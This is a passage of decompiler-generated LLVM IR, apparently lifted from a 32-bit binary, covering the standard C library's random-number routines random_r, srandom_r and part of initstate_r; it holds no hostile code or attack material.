dec_label_pc_8060291:                             ; preds = %dec_label_pc_8060278, %dec_label_pc_8060281
  %v0_8060291 = load i32, i32* %esi.global-to-local, align 4
  %v1_8060291 = add i32 %v0_8060291, -4
  %v2_8060291 = inttoptr i32 %v1_8060291 to i32*
  %v3_8060291 = load i32, i32* %v2_8060291, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8060299 = ashr i32 %v3_8060291, 31
  %v2_806029a = zext i32 %v3_8060291 to i64
  %v4_806029a = zext i32 %v1_8060299 to i64
  %v5_806029a = mul nuw i64 %v4_806029a, 4294967296
  %v6_806029a = or i64 %v5_806029a, %v2_806029a
  %v8_806029a = sdiv i64 %v6_806029a, 5
  %v9_806029a = trunc i64 %v8_806029a to i32
  store i32 %v9_806029a, i32* %eax.global-to-local, align 4
  %v10_806029a = srem i64 %v6_806029a, 5
  %v11_806029a = trunc i64 %v10_806029a to i32
  %v6_806029f = icmp ugt i32 %v11_806029a, 4
  br i1 %v6_806029f, label %dec_label_pc_80602df, label %dec_label_pc_80602a1

dec_label_pc_80602a1:                             ; preds = %dec_label_pc_8060291
  %v1_80602a1 = mul i32 %v11_806029a, 4
  %v2_80602a1 = add i32 %v1_80602a1, ptrtoint (i32* @global_var_806d7f4.759 to i32)
  %v3_80602a1 = inttoptr i32 %v2_80602a1 to i32*
  %v4_80602a1 = load i32, i32* %v3_80602a1, align 4
  store i32 %v4_80602a1, i32* @ecx, align 4
  %v2_80602a8 = add i32 %v1_80602a1, ptrtoint (i32* @global_var_806d7e0.760 to i32)
  %v3_80602a8 = inttoptr i32 %v2_80602a8 to i32*
  %v4_80602a8 = load i32, i32* %v3_80602a8, align 4
  store i32 %v4_80602a8, i32* %ebp.global-to-local, align 4
  %v1_80602af = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602af = add i32 %v1_80602af, 16
  %v3_80602af = inttoptr i32 %v2_80602af to i32*
  store i32 %v4_80602a1, i32* %v3_80602af, align 4
  %v0_80602b2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_80602b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602b2 = add i32 %v1_80602b2, 20
  %v3_80602b2 = inttoptr i32 %v2_80602b2 to i32*
  store i32 %v0_80602b2, i32* %v3_80602b2, align 4
  %v1_80602b5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602b5 = add i32 %v1_80602b5, 12
  %v3_80602b5 = inttoptr i32 %v2_80602b5 to i32*
  store i32 %v11_806029a, i32* %v3_80602b5, align 4
  %v1_80602b8 = icmp eq i32 %v11_806029a, 0
  br i1 %v1_80602b8, label %dec_label_pc_80602d2, label %dec_label_pc_80602bc

dec_label_pc_80602bc:                             ; preds = %dec_label_pc_80602a1
  %v0_80602bc = load i32, i32* %esi.global-to-local, align 4
  %v1_80602bc = add i32 %v0_80602bc, -4
  %v2_80602bc = inttoptr i32 %v1_80602bc to i32*
  %v3_80602bc = load i32, i32* %v2_80602bc, align 4
  %v1_80602bf = ashr i32 %v3_80602bc, 31
  %v0_80602c0 = load i32, i32* %edi.global-to-local, align 4
  %v2_80602c0 = zext i32 %v3_80602bc to i64
  %v4_80602c0 = zext i32 %v1_80602bf to i64
  %v5_80602c0 = mul nuw i64 %v4_80602c0, 4294967296
  %v6_80602c0 = or i64 %v5_80602c0, %v2_80602c0
  %v7_80602c0 = zext i32 %v0_80602c0 to i64
  %v8_80602c0 = sdiv i64 %v6_80602c0, %v7_80602c0
  %v9_80602c0 = trunc i64 %v8_80602c0 to i32
  %v2_80602c2 = mul i32 %v9_80602c0, 4
  %v3_80602c2 = add i32 %v2_80602c2, %v0_80602bc
  %v1_80602c5 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80602c5 = add i32 %v1_80602c5, %v9_80602c0
  store i32 %v2_80602c5, i32* %eax.global-to-local, align 4
  %v1_80602c7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602c7 = add i32 %v1_80602c7, 4
  %v3_80602c7 = inttoptr i32 %v2_80602c7 to i32*
  store i32 %v3_80602c2, i32* %v3_80602c7, align 4
  %v0_80602ca = load i32, i32* %eax.global-to-local, align 4
  %v1_80602ca = ashr i32 %v0_80602ca, 31
  %v0_80602cb = load i32, i32* @ecx, align 4
  %v2_80602cb = zext i32 %v0_80602ca to i64
  %v4_80602cb = zext i32 %v1_80602ca to i64
  %v5_80602cb = mul nuw i64 %v4_80602cb, 4294967296
  %v6_80602cb = or i64 %v5_80602cb, %v2_80602cb
  %v7_80602cb = zext i32 %v0_80602cb to i64
  %v8_80602cb = sdiv i64 %v6_80602cb, %v7_80602cb
  %v9_80602cb = trunc i64 %v8_80602cb to i32
  store i32 %v9_80602cb, i32* %eax.global-to-local, align 4
  %v10_80602cb = srem i64 %v6_80602cb, %v7_80602cb
  %v11_80602cb = trunc i64 %v10_80602cb to i32
  %v0_80602cd = load i32, i32* %esi.global-to-local, align 4
  %v2_80602cd = mul i32 %v11_80602cb, 4
  %v3_80602cd = add i32 %v2_80602cd, %v0_80602cd
  %v1_80602d0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602d0 = inttoptr i32 %v1_80602d0 to i32*
  store i32 %v3_80602cd, i32* %v2_80602d0, align 4
  br label %dec_label_pc_80602d2

dec_label_pc_80602d2:                             ; preds = %dec_label_pc_80602a1, %dec_label_pc_80602bc
  %v0_80602d2 = load i32, i32* %esi.global-to-local, align 4
  %v1_80602d2 = load i32, i32* @ecx, align 4
  %v2_80602d2 = mul i32 %v1_80602d2, 4
  %v3_80602d2 = add i32 %v2_80602d2, %v0_80602d2
  store i32 %v3_80602d2, i32* %eax.global-to-local, align 4
  %v1_80602d5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602d5 = add i32 %v1_80602d5, 8
  %v3_80602d5 = inttoptr i32 %v2_80602d5 to i32*
  store i32 %v0_80602d2, i32* %v3_80602d5, align 4
  %v0_80602d8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80602d8 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80602d8 = add i32 %v1_80602d8, 24
  %v3_80602d8 = inttoptr i32 %v2_80602d8 to i32*
  store i32 %v0_80602d8, i32* %v3_80602d8, align 4
  br label %dec_label_pc_80602ed

dec_label_pc_80602df:                             ; preds = %dec_label_pc_8060291
  %v1_80602df = call i32 @__errno_location(i32 %v0_806025f)
  store i32 %v1_80602df, i32* %eax.global-to-local, align 4
  %v1_80602e4 = inttoptr i32 %v1_80602df to i32*
  store i32 22, i32* %v1_80602e4, align 4
  br label %dec_label_pc_80602ed

dec_label_pc_80602ed:                             ; preds = %dec_label_pc_80602d2, %dec_label_pc_80602df
  %storemerge = phi i32 [ -1, %dec_label_pc_80602df ], [ 0, %dec_label_pc_80602d2 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_806025f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_80602d2, { 1, 0 }
  uselistorder i32 %v11_806029a, { 3, 1, 2, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_80602ed, { 1, 0 }
  uselistorder label %dec_label_pc_80602d2, { 1, 0 }
  uselistorder label %dec_label_pc_8060291, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80602f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80602f8, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8060301 = add i32 %tmp2, 8
  %v2_8060301 = inttoptr i32 %v1_8060301 to i32*
  %v3_8060301 = load i32, i32* %v2_8060301, align 4
  store i32 %v3_8060301, i32* %esi.global-to-local, align 4
  %v1_8060304 = add i32 %tmp2, 12
  %v2_8060304 = inttoptr i32 %v1_8060304 to i32*
  %v3_8060304 = load i32, i32* %v2_8060304, align 4
  %v4_8060304 = icmp eq i32 %v3_8060304, 0
  %v1_8060308 = icmp eq i1 %v4_8060304, false
  br i1 %v1_8060308, label %dec_label_pc_8060321, label %dec_label_pc_806030a

dec_label_pc_806030a:                             ; preds = %entry
  %v2_806030a = inttoptr i32 %v3_8060301 to i32*
  %v3_806030a = load i32, i32* %v2_806030a, align 4
  %v5_806030a = mul i32 %v3_806030a, 1103515245
  %v1_8060310 = add i32 %v5_806030a, 12345
  %v1_8060315 = urem i32 %v1_8060310, -2147483648
  store i32 %v1_8060315, i32* %eax.global-to-local, align 4
  store i32 %v1_8060315, i32* %v2_806030a, align 4
  %v0_806031c = load i32, i32* %eax.global-to-local, align 4
  %v1_806031c = load i32, i32* %ebp.global-to-local, align 4
  %v2_806031c = inttoptr i32 %v1_806031c to i32*
  store i32 %v0_806031c, i32* %v2_806031c, align 4
  br label %dec_label_pc_806034d

dec_label_pc_8060321:                             ; preds = %entry
  %v1_8060321 = add i32 %tmp2, 4
  %v2_8060321 = inttoptr i32 %v1_8060321 to i32*
  %v3_8060321 = load i32, i32* %v2_8060321, align 4
  store i32 %v3_8060321, i32* @ecx, align 4
  %v2_8060324 = load i32, i32* %arg1, align 4
  store i32 %v2_8060324, i32* %edx.global-to-local, align 4
  %v1_8060326 = add i32 %tmp2, 24
  %v2_8060326 = inttoptr i32 %v1_8060326 to i32*
  %v3_8060326 = load i32, i32* %v2_8060326, align 4
  store i32 %v3_8060326, i32* %edi.global-to-local, align 4
  %v1_8060329 = inttoptr i32 %v3_8060321 to i32*
  %v2_8060329 = load i32, i32* %v1_8060329, align 4
  store i32 %v2_8060329, i32* %eax.global-to-local, align 4
  %v1_806032b = inttoptr i32 %v2_8060324 to i32*
  %v2_806032b = load i32, i32* %v1_806032b, align 4
  %v4_806032b = add i32 %v2_806032b, %v2_8060329
  store i32 %v4_806032b, i32* %v1_806032b, align 4
  %v0_806032d = load i32, i32* %edx.global-to-local, align 4
  %v1_806032d = inttoptr i32 %v0_806032d to i32*
  %v2_806032d = load i32, i32* %v1_806032d, align 4
  %v1_806032f = add i32 %v0_806032d, 4
  store i32 %v1_806032f, i32* %edx.global-to-local, align 4
  %v2_8060332 = udiv i32 %v2_806032d, 2
  %v1_8060334 = load i32, i32* %edi.global-to-local, align 4
  %v7_8060334 = icmp ult i32 %v1_806032f, %v1_8060334
  %v1_8060336 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8060336 = inttoptr i32 %v1_8060336 to i32*
  store i32 %v2_8060332, i32* %v2_8060336, align 4
  %v0_8060339 = load i32, i32* @ecx, align 4
  %v1_8060339 = add i32 %v0_8060339, 4
  store i32 %v1_8060339, i32* %eax.global-to-local, align 4
  br i1 %v7_8060334, label %dec_label_pc_8060342, label %dec_label_pc_806033e

dec_label_pc_806033e:                             ; preds = %dec_label_pc_8060321
  %v0_806033e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_806033e, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060348

dec_label_pc_8060342:                             ; preds = %dec_label_pc_8060321
  %v1_8060342 = load i32, i32* %edi.global-to-local, align 4
  %v7_8060342 = icmp ult i32 %v1_8060339, %v1_8060342
  br i1 %v7_8060342, label %dec_label_pc_8060348, label %dec_label_pc_8060346

dec_label_pc_8060346:                             ; preds = %dec_label_pc_8060342
  %v0_8060346 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8060346, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060348

dec_label_pc_8060348:                             ; preds = %dec_label_pc_8060342, %dec_label_pc_806033e, %dec_label_pc_8060346
  %v0_8060348 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060348 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8060348 = inttoptr i32 %v1_8060348 to i32*
  store i32 %v0_8060348, i32* %v2_8060348, align 4
  %v0_806034a = load i32, i32* %eax.global-to-local, align 4
  %v1_806034a = load i32, i32* %ebx.global-to-local, align 4
  %v2_806034a = add i32 %v1_806034a, 4
  %v3_806034a = inttoptr i32 %v2_806034a to i32*
  store i32 %v0_806034a, i32* %v3_806034a, align 4
  br label %dec_label_pc_806034d

dec_label_pc_806034d:                             ; preds = %dec_label_pc_806030a, %dec_label_pc_8060348
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_806034f = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_806034f, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8060315, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_806034d, { 1, 0 }
  uselistorder label %dec_label_pc_8060348, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8060354 = load i32, i32* @ebp, align 4
  %v0_8060355 = load i32, i32* @edi, align 4
  %v0_8060356 = load i32, i32* @esi, align 4
  %v0_8060357 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_8060362 = trunc i64 %arg1 to i32
  store i32 %v4_8060362, i32* %eax.global-to-local, align 4
  %v1_8060366 = add i32 %arg2, 12
  %v2_8060366 = inttoptr i32 %v1_8060366 to i32*
  %v3_8060366 = load i32, i32* %v2_8060366, align 4
  store i32 %v3_8060366, i32* %edx.global-to-local, align 4
  %v6_806036c = icmp ugt i32 %v3_8060366, 4
  br i1 %v6_806036c, label %dec_label_pc_80603e0, label %dec_label_pc_806036e

dec_label_pc_806036e:                             ; preds = %entry
  %v1_806036e = add i32 %arg2, 8
  %v2_806036e = inttoptr i32 %v1_806036e to i32*
  %v3_806036e = load i32, i32* %v2_806036e, align 4
  store i32 %v3_806036e, i32* %ebx.global-to-local, align 4
  %v1_8060371 = icmp eq i32 %v4_8060362, 0
  %v1_8060373 = icmp eq i1 %v1_8060371, false
  br i1 %v1_8060373, label %dec_label_pc_8060377, label %dec_label_pc_8060375

dec_label_pc_8060375:                             ; preds = %dec_label_pc_806036e
  %v1_8060375 = and i32 %v4_8060362, -256
  %v2_8060375 = or i32 %v1_8060375, 1
  store i32 %v2_8060375, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060377

dec_label_pc_8060377:                             ; preds = %dec_label_pc_806036e, %dec_label_pc_8060375
  %v0_8060377 = phi i32 [ %v4_8060362, %dec_label_pc_806036e ], [ %v2_8060375, %dec_label_pc_8060375 ]
  %v2_8060377 = inttoptr i32 %v3_806036e to i32*
  store i32 %v0_8060377, i32* %v2_8060377, align 4
  %v1_8060379 = icmp eq i32 %v3_8060366, 0
  br i1 %v1_8060379, label %dec_label_pc_80603de, label %dec_label_pc_806037d

dec_label_pc_806037d:                             ; preds = %dec_label_pc_8060377
  %v0_806037d = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_806037d, i32* %edx.global-to-local, align 4
  %v0_806037f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_806037f, i32* %ecx.global-to-local, align 4
  %v0_8060381 = load i32, i32* @esi, align 4
  %v1_8060381 = add i32 %v0_8060381, 16
  %v2_8060381 = inttoptr i32 %v1_8060381 to i32*
  %v3_8060381 = load i32, i32* %v2_8060381, align 4
  store i32 %v3_8060381, i32* %eax.global-to-local, align 4
  %v4_8060389 = sext i32 %v3_8060381 to i64
  store i64 %v4_8060389, i64* %stack_var_-40, align 8
  %v5_80603bb30 = icmp sgt i32 %v3_8060381, 1
  br i1 %v5_80603bb30, label %dec_label_pc_806038e, label %dec_label_pc_80603bd

dec_label_pc_806038e:                             ; preds = %dec_label_pc_806037d, %dec_label_pc_806038e.dec_label_pc_806038e_crit_edge
  %v0_80603b2 = phi i32 [ %v0_80603b2.pre, %dec_label_pc_806038e.dec_label_pc_806038e_crit_edge ], [ %v0_806037f, %dec_label_pc_806037d ]
  %v0_806038e = phi i32 [ %v0_806038e.pre, %dec_label_pc_806038e.dec_label_pc_806038e_crit_edge ], [ %v0_806037d, %dec_label_pc_806037d ]
  %v0_80603b531 = phi i32 [ %v0_80603b8.pre, %dec_label_pc_806038e.dec_label_pc_806038e_crit_edge ], [ 1, %dec_label_pc_806037d ]
  %v1_8060395 = ashr i32 %v0_806038e, 31
  %v2_8060396 = zext i32 %v0_806038e to i64
  %v4_8060396 = zext i32 %v1_8060395 to i64
  %v5_8060396 = mul nuw i64 %v4_8060396, 4294967296
  %v6_8060396 = or i64 %v5_8060396, %v2_8060396
  %v8_8060396 = sdiv i64 %v6_8060396, 127773
  %v9_8060396 = trunc i64 %v8_8060396 to i32
  %v10_8060396 = srem i64 %v6_8060396, 127773
  %v3_806039c = mul nsw i64 %v10_8060396, 16807
  %v4_806039c = trunc i64 %v3_806039c to i32
  %v3_80603a2 = mul i32 %v9_8060396, 2836
  store i32 %v3_80603a2, i32* %eax.global-to-local, align 4
  %v2_80603a8 = sub i32 %v4_806039c, %v3_80603a2
  %v13_80603a8 = icmp slt i32 %v2_80603a8, 0
  %v1_80603aa = icmp eq i1 %v13_80603a8, false
  %v1_80603ac = add i32 %v2_80603a8, 2147483647
  %v2_80603a8.v1_80603ac = select i1 %v1_80603aa, i32 %v2_80603a8, i32 %v1_80603ac
  store i32 %v2_80603a8.v1_80603ac, i32* %edx.global-to-local, align 4
  %v1_80603b2 = add i32 %v0_80603b2, 4
  store i32 %v1_80603b2, i32* %ecx.global-to-local, align 4
  %v1_80603b5 = add i32 %v0_80603b531, 1
  store i32 %v1_80603b5, i32* @edi, align 4
  %v2_80603b6 = inttoptr i32 %v1_80603b2 to i32*
  store i32 %v2_80603a8.v1_80603ac, i32* %v2_80603b6, align 4
  %v0_80603b8.pre = load i32, i32* @edi, align 4
  %v3_80603b8.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_80603b8.pre to i32
  %v5_80603bb = icmp slt i32 %v0_80603b8.pre, %extract.t12
  br i1 %v5_80603bb, label %dec_label_pc_806038e.dec_label_pc_806038e_crit_edge, label %dec_label_pc_80603b8.dec_label_pc_80603bd_crit_edge

dec_label_pc_806038e.dec_label_pc_806038e_crit_edge: ; preds = %dec_label_pc_806038e
  %v0_806038e.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_80603b2.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_806038e

dec_label_pc_80603b8.dec_label_pc_80603bd_crit_edge: ; preds = %dec_label_pc_806038e
  %v0_80603bd.pre = load i32, i32* @esi, align 4
  %v0_80603c0.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80603bd

dec_label_pc_80603bd:                             ; preds = %dec_label_pc_80603b8.dec_label_pc_80603bd_crit_edge, %dec_label_pc_806037d
  %v0_80603c0 = phi i32 [ %v0_80603c0.pre, %dec_label_pc_80603b8.dec_label_pc_80603bd_crit_edge ], [ %v0_806037f, %dec_label_pc_806037d ]
  %v0_80603bd = phi i32 [ %v0_80603bd.pre, %dec_label_pc_80603b8.dec_label_pc_80603bd_crit_edge ], [ %v0_8060381, %dec_label_pc_806037d ]
  %v1_80603bd = add i32 %v0_80603bd, 20
  %v2_80603bd = inttoptr i32 %v1_80603bd to i32*
  %v3_80603bd = load i32, i32* %v2_80603bd, align 4
  store i32 %v3_80603bd, i32* %eax.global-to-local, align 4
  %v2_80603c0 = add i32 %v0_80603bd, 4
  %v3_80603c0 = inttoptr i32 %v2_80603c0 to i32*
  store i32 %v0_80603c0, i32* %v3_80603c0, align 4
  %v0_80603c3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80603c3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80603c3 = mul i32 %v1_80603c3, 4
  %v3_80603c3 = add i32 %v2_80603c3, %v0_80603c3
  store i32 %v3_80603c3, i32* %eax.global-to-local, align 4
  %v1_80603c6 = load i32, i32* @esi, align 4
  %v2_80603c6 = inttoptr i32 %v1_80603c6 to i32*
  store i32 %v3_80603c3, i32* %v2_80603c6, align 4
  %v3_80603c8 = load i64, i64* %stack_var_-40, align 8
  %v6_80603c8 = mul nsw i64 %v3_80603c8, 10
  %v7_80603c8 = trunc i64 %v6_80603c8 to i32
  %v2_80603ce = ptrtoint i32* %stack_var_-20 to i32
  %v1_80603db24 = add i32 %v7_80603c8, -1
  %v9_80603db28 = icmp slt i32 %v1_80603db24, 0
  store i32 %v1_80603db24, i32* @ebx, align 4
  %v1_80603dc29 = icmp eq i1 %v9_80603db28, false
  br i1 %v1_80603dc29, label %dec_label_pc_80603ce, label %dec_label_pc_80603de

dec_label_pc_80603ce:                             ; preds = %dec_label_pc_80603bd, %dec_label_pc_80603ce
  store i32 %v2_80603ce, i32* %eax.global-to-local, align 4
  %v0_80603d3 = load i32, i32* @esi, align 4
  %v2_80603d4 = inttoptr i32 %v0_80603d3 to i32*
  %v3_80603d4 = call i32 @__GI_random_r(i32* %v2_80603d4, i32 %v2_80603ce)
  store i32 %v0_80603d3, i32* %eax.global-to-local, align 4
  store i32 %v2_80603ce, i32* %edx.global-to-local, align 4
  %v0_80603db.pre = load i32, i32* @ebx, align 4
  %v1_80603db = add i32 %v0_80603db.pre, -1
  %v9_80603db = icmp slt i32 %v1_80603db, 0
  store i32 %v1_80603db, i32* @ebx, align 4
  %v1_80603dc = icmp eq i1 %v9_80603db, false
  br i1 %v1_80603dc, label %dec_label_pc_80603ce, label %dec_label_pc_80603de

dec_label_pc_80603de:                             ; preds = %dec_label_pc_80603bd, %dec_label_pc_80603ce, %dec_label_pc_8060377
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80603e0

dec_label_pc_80603e0:                             ; preds = %entry, %dec_label_pc_80603de
  %v0_80603e3 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80603de ]
  store i32 %v0_80603e3, i32* %eax.global-to-local, align 4
  store i32 %v0_8060357, i32* @ebx, align 4
  store i32 %v0_8060356, i32* @esi, align 4
  store i32 %v0_8060355, i32* @edi, align 4
  store i32 %v0_8060354, i32* @ebp, align 4
  ret i32 %v0_80603e3

; uselistorder directives
  uselistorder i32 %v0_80603e3, { 1, 0 }
  uselistorder i32 %v1_80603db, { 1, 0 }
  uselistorder i32 %v0_80603bd, { 1, 0 }
  uselistorder i32 %v0_80603b8.pre, { 1, 0 }
  uselistorder i32 %v2_80603a8.v1_80603ac, { 1, 0 }
  uselistorder i32 %v0_806038e, { 1, 0 }
  uselistorder i32 %v0_806037f, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80603e0, { 1, 0 }
  uselistorder label %dec_label_pc_80603de, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80603ce, { 1, 0 }
  uselistorder label %dec_label_pc_806038e, { 1, 0 }
  uselistorder label %dec_label_pc_8060377, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_80603ea = load i32, i32* @ebp, align 4
  %v0_80603ed = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_806040e, label %dec_label_pc_8060402

dec_label_pc_8060402:                             ; preds = %entry
  %v2_8060402 = icmp ult i32 %arg3, 256
  %v1_8060409 = select i1 %v2_8060402, i32 5, i32 4
  store i32 %v1_8060409, i32* @ebx, align 4
  br label %dec_label_pc_8060424

dec_label_pc_806040e:                             ; preds = %entry
  %v6_8060411 = icmp ugt i32 %arg3, 31
  br i1 %v6_8060411, label %dec_label_pc_806041c, label %dec_label_pc_8060413

dec_label_pc_8060413:                             ; preds = %dec_label_pc_806040e
  store i32 0, i32* @ebx, align 4
  %v6_8060418 = icmp ugt i32 %arg3, 7
  br i1 %v6_8060418, label %dec_label_pc_8060424, label %dec_label_pc_8060474

dec_label_pc_806041c:                             ; preds = %dec_label_pc_806040e
  %v2_806041c = icmp ult i32 %arg3, 64
  %v1_8060421 = select i1 %v2_806041c, i32 3, i32 2
  store i32 %v1_8060421, i32* @ebx, align 4
  br label %dec_label_pc_8060424

dec_label_pc_8060424:                             ; preds = %dec_label_pc_8060413, %dec_label_pc_8060402, %dec_label_pc_806041c
  %v0_8060424 = phi i32 [ 0, %dec_label_pc_8060413 ], [ %v1_8060409, %dec_label_pc_8060402 ], [ %v1_8060421, %dec_label_pc_806041c ]
  %v1_8060424 = mul nuw nsw i32 %v0_8060424, 4
  %v2_8060424 = add i32 %v1_8060424, ptrtoint (i32* @global_var_806d7f4.759 to i32)
  %v3_8060424 = inttoptr i32 %v2_8060424 to i32*
  %v4_8060424 = load i32, i32* %v3_8060424, align 4
  store i32 %v4_8060424, i32* %eax.global-to-local, align 4
  %v1_806042b = add i32 %tmp7, 4
  store i32 %v1_806042b, i32* @esi, align 4
  %v2_806042e = add i32 %arg4, 16
  %v3_806042e = inttoptr i32 %v2_806042e to i32*
  store i32 %v4_8060424, i32* %v3_806042e, align 4
  %v0_8060431 = load i32, i32* @ebx, align 4
  %v1_8060431 = mul i32 %v0_8060431, 4
  %v2_8060431 = add i32 %v1_8060431, ptrtoint (i32* @global_var_806d7e0.760 to i32)
  %v3_8060431 = inttoptr i32 %v2_8060431 to i32*
  %v4_8060431 = load i32, i32* %v3_8060431, align 4
  store i32 %v4_8060431, i32* %edx.global-to-local, align 4
  %v0_8060438 = load i32, i32* @esi, align 4
  %v1_8060438 = load i32, i32* %eax.global-to-local, align 4
  %v2_8060438 = mul i32 %v1_8060438, 4
  %v3_8060438 = add i32 %v2_8060438, %v0_8060438
  store i32 %v3_8060438, i32* %eax.global-to-local, align 4
  %v1_806043b = load i32, i32* @edi, align 4
  %v2_806043b = add i32 %v1_806043b, 12
  %v3_806043b = inttoptr i32 %v2_806043b to i32*
  store i32 %v0_8060431, i32* %v3_806043b, align 4
  %v0_806043e = load i32, i32* %edx.global-to-local, align 4
  %v1_806043e = load i32, i32* @edi, align 4
  %v2_806043e = add i32 %v1_806043e, 20
  %v3_806043e = inttoptr i32 %v2_806043e to i32*
  store i32 %v0_806043e, i32* %v3_806043e, align 4
  %v0_8060441 = load i32, i32* %eax.global-to-local, align 4
  %v1_8060441 = load i32, i32* @edi, align 4
  %v2_8060441 = add i32 %v1_8060441, 24
  %v3_8060441 = inttoptr i32 %v2_8060441 to i32*
  store i32 %v0_8060441, i32* %v3_8060441, align 4
  %v0_8060444 = load i32, i32* @esi, align 4
  %v1_8060444 = load i32, i32* @edi, align 4
  %v2_8060444 = add i32 %v1_8060444, 8
  %v3_8060444 = inttoptr i32 %v2_8060444 to i32*
  store i32 %v0_8060444, i32* %v3_8060444, align 4
  %v0_8060447 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_806044c = sext i32 %arg1 to i64
  %v3_806044c = call i32 @srandom_r(i64 %v2_806044c, i32 %v0_8060447)
  %v0_8060451 = load i32, i32* @ebp, align 4
  %v1_8060451 = inttoptr i32 %v0_8060451 to i32*
  store i32 0, i32* %v1_8060451, align 4
  %v2_8060458 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_8060458, i32* @ecx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_806045c = load i32, i32* @ebx, align 4
  %v1_806045c = icmp eq i32 %v0_806045c, 0
  br i1 %v1_806045c, label %dec_label_pc_806048d, label %dec_label_pc_8060460

dec_label_pc_8060460:                             ; preds = %dec_label_pc_8060424
  %v0_8060460 = load i32, i32* @edi, align 4
  %v1_8060460 = add i32 %v0_8060460, 4
  %v2_8060460 = inttoptr i32 %v1_8060460 to i32*
  %v3_8060460 = load i32, i32* %v2_8060460, align 4
  %v1_8060463 = load i32, i32* @esi, align 4
  %v2_8060463 = sub i32 %v3_8060460, %v1_8060463
  %v2_8060465 = sdiv i32 %v2_8060463, 4
  %v3_8060468 = mul i32 %v2_8060465, 5
  %v2_806046b = add i32 %v3_8060468, %v0_806045c
  %v1_806046d = load i32, i32* @ebp, align 4
  %v2_806046d = inttoptr i32 %v1_806046d to i32*
  store i32 %v2_806046b, i32* %v2_806046d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_806048d

dec_label_pc_8060474:                             ; preds = %dec_label_pc_8060413
  %v1_8060474 = call i32 @__errno_location(i32 %v0_80603ed)
